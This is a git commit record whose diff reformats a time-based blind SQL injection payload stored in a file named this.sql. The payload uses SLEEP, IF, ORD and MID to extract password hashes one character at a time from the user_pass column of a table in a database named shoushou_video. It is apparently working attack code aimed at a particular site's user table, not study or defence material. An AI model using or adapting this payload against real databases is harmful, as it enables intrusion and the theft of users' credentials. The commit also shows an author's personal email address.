2b6becfc98b5bc5a391602fec0fb8547e5c021af
LAPTOP-TGV01QNG\lenovo <eddie222.diamoand@gmail.com>
2021-02-07 20:26:10 +0800

    FIXED

--- this.sql
+++ this.sql
@@ -7,10 +7,15 @@
 				SLEEP(2- 
 				(IF( ORD(
 							MID(
-							( 
-							   SELECT IFNULL( CAST( user_pass AS NCHAR ), 0x20 ) 
-								 FROM shoushou_video.cmf_user 
-								 ORDER BY user_pass LIMIT 417, 1 ), 1, 1 ))> 32,
+							  ( 
+								SELECT IFNULL( CAST( user_pass AS NCHAR ), 0x20 ) 
+								FROM shoushou_video.cmf_user 
+								ORDER BY user_pass LIMIT 417, 1 
+						      ), 
+							  1, 
+							  1 
+						    )
+						) > 32,
 							0,
 						2 
 	))))) KVoj)
